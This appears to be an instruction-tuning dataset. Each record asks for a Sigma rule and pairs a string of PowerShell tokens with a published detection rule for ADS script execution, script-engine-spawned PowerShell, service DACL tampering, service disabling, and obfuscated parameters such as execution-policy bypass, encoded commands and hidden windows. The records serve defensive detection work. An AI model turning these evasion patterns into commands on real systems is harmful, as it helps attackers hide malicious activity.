{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe \\pwsh.exe \\powershell.exe -Stream Get-Content", "output": "title: Run PowerShell Script from ADS\nid: 45a594aa-1fbd-4972-a809-ff5a99dd81b8\nstatus: test\ndescription: Detects PowerShell script execution from Alternate Data Stream (ADS)\nreferences:\n    - https://github.com/p0shkatz/Get-ADS/blob/1c3a3562e713c254edce1995a7d9879c687c7473/Get-ADS.ps1\nauthor: Sergey Soldatov, Kaspersky Lab, oscd.community\ndate: 2019-10-30\nmodified: 2022-07-14\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains|all:\n            - 'Get-Content'\n            - '-Stream'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe \\cscript.exe \\powershell.exe \\pwsh.exe", "output": "title: Suspicious PowerShell Invocation From Script Engines\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nstatus: test\ndescription: Detects suspicious powershell invocations from interpreters or unusual programs\nreferences:\n    - https://www.securitynewspaper.com/2017/03/20/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter_health_service:\n        CurrentDirectory|contains: '\\Health Service State\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Microsoft Operations Manager (MOM)\n    - Other scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe \\cscript.exe \"\\powershell.exe\" \\pwsh.exe", "output": "title: Suspicious PowerShell Invocation From Script Engines\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nstatus: test\ndescription: Detects suspicious powershell invocations from interpreters or unusual programs\nreferences:\n    - https://www.securitynewspaper.com/2017/03/20/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter_health_service:\n        CurrentDirectory|contains: '\\Health Service State\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Microsoft Operations Manager (MOM)\n    - Other scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript \\cscript \\powershell \\pwsh", "output": "title: Suspicious PowerShell Invocation From Script Engines\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nstatus: test\ndescription: Detects suspicious powershell invocations from interpreters or unusual programs\nreferences:\n    - https://www.securitynewspaper.com/2017/03/20/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter_health_service:\n        CurrentDirectory|contains: '\\Health Service State\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Microsoft Operations Manager (MOM)\n    - Other scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wscript.exe \\cscript.exe \\pwsh.exe \\powershell.exe", "output": "title: Suspicious PowerShell Invocation From Script Engines\nid: 95eadcb2-92e4-4ed1-9031-92547773a6db\nstatus: test\ndescription: Detects suspicious powershell invocations from interpreters or unusual programs\nreferences:\n    - https://www.securitynewspaper.com/2017/03/20/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-01-05\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter_health_service:\n        CurrentDirectory|contains: '\\Health Service State\\'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Microsoft Operations Manager (MOM)\n    - Other scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh.exe pwsh.dll -SecurityDescriptorSddl -sd Set-Service D;; ;;;IU ;;;SU ;;;BA ;;;SY ;;;WD", "output": "title: Suspicious Service DACL Modification Via Set-Service Cmdlet\nid: a95b9b42-1308-4735-a1af-abb1c5e6f5ac\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37\n      type: derived\nstatus: test\ndescription: Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://learn.microsoft.com/pt-br/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-18\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl_flag:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    selection_set_service:\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'D;;'\n        CommandLine|contains:\n            - ';;;IU'\n            - ';;;SU'\n            - ';;;BA'\n            - ';;;SY'\n            - ';;;WD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh.exe pwsh.dll -SecurityDescriptorSddl -sd Set-Service D;; ;;;IU \\\";;;SU\\\" ;;;BA ;;;SY ;;;WD", "output": "title: Suspicious Service DACL Modification Via Set-Service Cmdlet\nid: a95b9b42-1308-4735-a1af-abb1c5e6f5ac\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37\n      type: derived\nstatus: test\ndescription: Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://learn.microsoft.com/pt-br/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-18\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl_flag:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    selection_set_service:\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'D;;'\n        CommandLine|contains:\n            - ';;;IU'\n            - ';;;SU'\n            - ';;;BA'\n            - ';;;SY'\n            - ';;;WD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh pwsh.dll -SecurityDescriptorSddl -sd Set-Service D;; ;;;IU ;;;SU ;;;BA ;;;SY ;;;WD", "output": "title: Suspicious Service DACL Modification Via Set-Service Cmdlet\nid: a95b9b42-1308-4735-a1af-abb1c5e6f5ac\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37\n      type: derived\nstatus: test\ndescription: Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://learn.microsoft.com/pt-br/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-18\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl_flag:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    selection_set_service:\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'D;;'\n        CommandLine|contains:\n            - ';;;IU'\n            - ';;;SU'\n            - ';;;BA'\n            - ';;;SY'\n            - ';;;WD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\pwsh.exe pwsh.dll -SecurityDescriptorSddl -sd Set-Service D;; ;;;IU ;;;SU ;;;BA ;;;SY ;;;WD", "output": "title: Suspicious Service DACL Modification Via Set-Service Cmdlet\nid: a95b9b42-1308-4735-a1af-abb1c5e6f5ac\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37\n      type: derived\nstatus: test\ndescription: Detects suspicious DACL modifications via the \"Set-Service\" cmdlet using the \"SecurityDescriptorSddl\" flag (Only available with PowerShell 7) that can be used to hide services or make them unstopable\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://learn.microsoft.com/pt-br/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-18\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\pwsh.exe'\n        - OriginalFileName: 'pwsh.dll'\n    selection_sddl_flag:\n        CommandLine|contains:\n            - '-SecurityDescriptorSddl '\n            - '-sd '\n    selection_set_service:\n        CommandLine|contains|all:\n            - 'Set-Service '\n            - 'D;;'\n        CommandLine|contains:\n            - ';;;IU'\n            - ';;;SU'\n            - ';;;BA'\n            - ';;;SY'\n            - ';;;WD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe PowerShell.EXE Set-Service -StartupType Disabled Manual", "output": "title: Service StartupType Change Via PowerShell Set-Service\nid: 62b20d44-1546-4e61-afce-8e175eb9473c\nstatus: test\ndescription: Detects the use of the PowerShell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\" or \"manual\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\powershell.exe'\n        - OriginalFileName: 'PowerShell.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'Set-Service'\n            - '-StartupType'\n        CommandLine|contains:\n            - 'Disabled'\n            - 'Manual'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe PowerShell.EXE Set-Service -StartupType \\\"Disabled\\\" Manual", "output": "title: Service StartupType Change Via PowerShell Set-Service\nid: 62b20d44-1546-4e61-afce-8e175eb9473c\nstatus: test\ndescription: Detects the use of the PowerShell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\" or \"manual\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\powershell.exe'\n        - OriginalFileName: 'PowerShell.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'Set-Service'\n            - '-StartupType'\n        CommandLine|contains:\n            - 'Disabled'\n            - 'Manual'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe PowerShell.EXE Set-Service -startupType Disabled Manual", "output": "title: Service StartupType Change Via PowerShell Set-Service\nid: 62b20d44-1546-4e61-afce-8e175eb9473c\nstatus: test\ndescription: Detects the use of the PowerShell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\" or \"manual\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\powershell.exe'\n        - OriginalFileName: 'PowerShell.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'Set-Service'\n            - '-StartupType'\n        CommandLine|contains:\n            - 'Disabled'\n            - 'Manual'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell PowerShell Set-Service -StartupType Disabled Manual", "output": "title: Service StartupType Change Via PowerShell Set-Service\nid: 62b20d44-1546-4e61-afce-8e175eb9473c\nstatus: test\ndescription: Detects the use of the PowerShell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\" or \"manual\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\powershell.exe'\n        - OriginalFileName: 'PowerShell.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'Set-Service'\n            - '-StartupType'\n        CommandLine|contains:\n            - 'Disabled'\n            - 'Manual'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe Set-Service Manual Disabled PowerShell.EXE -StartupType", "output": "title: Service StartupType Change Via PowerShell Set-Service\nid: 62b20d44-1546-4e61-afce-8e175eb9473c\nstatus: test\ndescription: Detects the use of the PowerShell \"Set-Service\" cmdlet to change the startup type of a service to \"disabled\" or \"manual\"\nreferences:\n    - https://www.virustotal.com/gui/file/38283b775552da8981452941ea74191aa0d203edd3f61fb2dee7b0aea3514955\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-03-04\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1562.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\powershell.exe'\n        - OriginalFileName: 'PowerShell.EXE'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'Set-Service'\n            - '-StartupType'\n        CommandLine|contains:\n            - 'Disabled'\n            - 'Manual'\n    condition: all of selection_*\nfalsepositives:\n    - False positives may occur with troubleshooting scripts\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe -windowstyle h -windowstyl h -windowsty h -windowst h -windows h -windo h -wind h -win h -wi h -win h -win hi -win hid -win hidd -win hidde -NoPr -NoPro -NoProf -NoProfi -NoProfil -nonin -nonint -noninte -noninter -nonintera -noninterac -noninteract -noninteracti -noninteractiv -ec -encodedComman -encodedComma -encodedComm -encodedCom -encodedCo -encodedC -encoded -encode -encod -enco -en -executionpolic -executionpoli -executionpol -executionpo -executionp -execution bypass -executio bypass -executi bypass -execut bypass -execu bypass -exec bypass -exe bypass -ex bypass -ep bypass /windowstyle h /windowstyl h /windowsty h /windowst h /windows h /windo h /wind h /win h /wi h /win h /win hi /win hid /win hidd /win hidde /NoPr /NoPro /NoProf /NoProfi /NoProfil /nonin /nonint /noninte /noninter /nonintera /noninterac /noninteract /noninteracti /noninteractiv /ec /encodedComman /encodedComma /encodedComm /encodedCom /encodedCo /encodedC /encoded /encode /encod /enco /en /executionpolic /executionpoli /executionpol /executionpo /executionp /execution bypass /executio bypass /executi bypass /execut bypass /execu bypass /exec bypass /exe bypass /ex bypass /ep bypass", "output": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: test\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\nauthor: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\ndate: 2019-01-16\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell.exe \\pwsh.exe -windowstyle h -windowstyl h -windowsty h -windowst h -windows h -windo h -wind h -win h -wi h -win h -win hi -win hid -win hidd -win hidde -NoPr -NoPro -NoProf -NoProfi -NoProfil -nonin -nonint -noninte -noninter -nonintera -noninterac -noninteract -noninteracti -noninteractiv -ec -encodedComman -encodedComma -encodedComm -encodedCom -encodedCo -encodedC -encoded -encode -encod -enco -en -executionpolic -executionpoli -executionpol -executionpo -executionp -execution bypass -executio bypass -executi bypass -execut bypass -execu bypass -exec bypass -exe bypass -ex bypass -ep bypass /windowstyle h /windowstyl h /windowsty h /windowst h /windows h /windo h /wind \\\"h\\\" /win h /wi h /win h /win hi /win hid /win hidd /win hidde /NoPr /NoPro /NoProf /NoProfi /NoProfil /nonin /nonint /noninte /noninter /nonintera /noninterac /noninteract /noninteracti /noninteractiv /ec /encodedComman /encodedComma /encodedComm /encodedCom /encodedCo /encodedC /encoded /encode /encod /enco /en /executionpolic /executionpoli /executionpol /executionpo /executionp /execution bypass /executio bypass /executi bypass /execut bypass /execu bypass /exec bypass /exe bypass /ex bypass /ep bypass", "output": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: test\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\nauthor: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\ndate: 2019-01-16\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\powershell \\pwsh -windowstyle h -windowstyl h -windowsty h -windowst h -windows h -windo h -wind h -win h -wi h -win h -win hi -win hid -win hidd -win hidde -NoPr -NoPro -NoProf -NoProfi -NoProfil -nonin -nonint -noninte -noninter -nonintera -noninterac -noninteract -noninteracti -noninteractiv -ec -encodedComman -encodedComma -encodedComm -encodedCom -encodedCo -encodedC -encoded -encode -encod -enco -en -executionpolic -executionpoli -executionpol -executionpo -executionp -execution bypass -executio bypass -executi bypass -execut bypass -execu bypass -exec bypass -exe bypass -ex bypass -ep bypass /windowstyle h /windowstyl h /windowsty h /windowst h /windows h /windo h /wind h /win h /wi h /win h /win hi /win hid /win hidd /win hidde /NoPr /NoPro /NoProf /NoProfi /NoProfil /nonin /nonint /noninte /noninter /nonintera /noninterac /noninteract /noninteracti /noninteractiv /ec /encodedComman /encodedComma /encodedComm /encodedCom /encodedCo /encodedC /encoded /encode /encod /enco /en /executionpolic /executionpoli /executionpol /executionpo /executionp /execution bypass /executio bypass /executi bypass /execut bypass /execu bypass /exec bypass /exe bypass /ex bypass /ep bypass", "output": "title: Suspicious PowerShell Parameter Substring\nid: 36210e0d-5b19-485d-a087-c096088885f0\nstatus: test\ndescription: Detects suspicious PowerShell invocation with a parameter substring\nreferences:\n    - http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\nauthor: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez (Fix)\ndate: 2019-01-16\nmodified: 2022-07-14\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -windowstyle h '\n            - ' -windowstyl h'\n            - ' -windowsty h'\n            - ' -windowst h'\n            - ' -windows h'\n            - ' -windo h'\n            - ' -wind h'\n            - ' -win h'\n            - ' -wi h'\n            - ' -win h '\n            - ' -win hi '\n            - ' -win hid '\n            - ' -win hidd '\n            - ' -win hidde '\n            - ' -NoPr '\n            - ' -NoPro '\n            - ' -NoProf '\n            - ' -NoProfi '\n            - ' -NoProfil '\n            - ' -nonin '\n            - ' -nonint '\n            - ' -noninte '\n            - ' -noninter '\n            - ' -nonintera '\n            - ' -noninterac '\n            - ' -noninteract '\n            - ' -noninteracti '\n            - ' -noninteractiv '\n            - ' -ec '\n            - ' -encodedComman '\n            - ' -encodedComma '\n            - ' -encodedComm '\n            - ' -encodedCom '\n            - ' -encodedCo '\n            - ' -encodedC '\n            - ' -encoded '\n            - ' -encode '\n            - ' -encod '\n            - ' -enco '\n            - ' -en '\n            - ' -executionpolic '\n            - ' -executionpoli '\n            - ' -executionpol '\n            - ' -executionpo '\n            - ' -executionp '\n            - ' -execution bypass'\n            - ' -executio bypass'\n            - ' -executi bypass'\n            - ' -execut bypass'\n            - ' -execu bypass'\n            - ' -exec bypass'\n            - ' -exe bypass'\n            - ' -ex bypass'\n            - ' -ep bypass'\n            - ' /windowstyle h '\n            - ' /windowstyl h'\n            - ' /windowsty h'\n            - ' /windowst h'\n            - ' /windows h'\n            - ' /windo h'\n            - ' /wind h'\n            - ' /win h'\n            - ' /wi h'\n            - ' /win h '\n            - ' /win hi '\n            - ' /win hid '\n            - ' /win hidd '\n            - ' /win hidde '\n            - ' /NoPr '\n            - ' /NoPro '\n            - ' /NoProf '\n            - ' /NoProfi '\n            - ' /NoProfil '\n            - ' /nonin '\n            - ' /nonint '\n            - ' /noninte '\n            - ' /noninter '\n            - ' /nonintera '\n            - ' /noninterac '\n            - ' /noninteract '\n            - ' /noninteracti '\n            - ' /noninteractiv '\n            - ' /ec '\n            - ' /encodedComman '\n            - ' /encodedComma '\n            - ' /encodedComm '\n            - ' /encodedCom '\n            - ' /encodedCo '\n            - ' /encodedC '\n            - ' /encoded '\n            - ' /encode '\n            - ' /encod '\n            - ' /enco '\n            - ' /en '\n            - ' /executionpolic '\n            - ' /executionpoli '\n            - ' /executionpol '\n            - ' /executionpo '\n            - ' /executionp '\n            - ' /execution bypass'\n            - ' /executio bypass'\n            - ' /executi bypass'\n            - ' /execut bypass'\n            - ' /execu bypass'\n            - ' /exec bypass'\n            - ' /exe bypass'\n            - ' /ex bypass'\n            - ' /ep bypass'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
